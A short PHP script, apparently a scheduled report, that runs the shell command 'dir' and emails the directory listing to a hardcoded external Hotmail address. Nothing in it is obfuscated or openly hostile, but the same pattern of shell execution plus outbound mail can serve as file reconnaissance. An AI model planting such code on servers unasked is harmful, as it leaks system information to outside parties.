<?php
$dir = shell_exec("dir");
$subject = "Half-hourly file report.";
$body = "The following files are in the current directory : \n\n";
$body .= $dir;
mail("aa@hotmail.com",$subject,$body,"From:bb@contechst.com\r\n");
?>
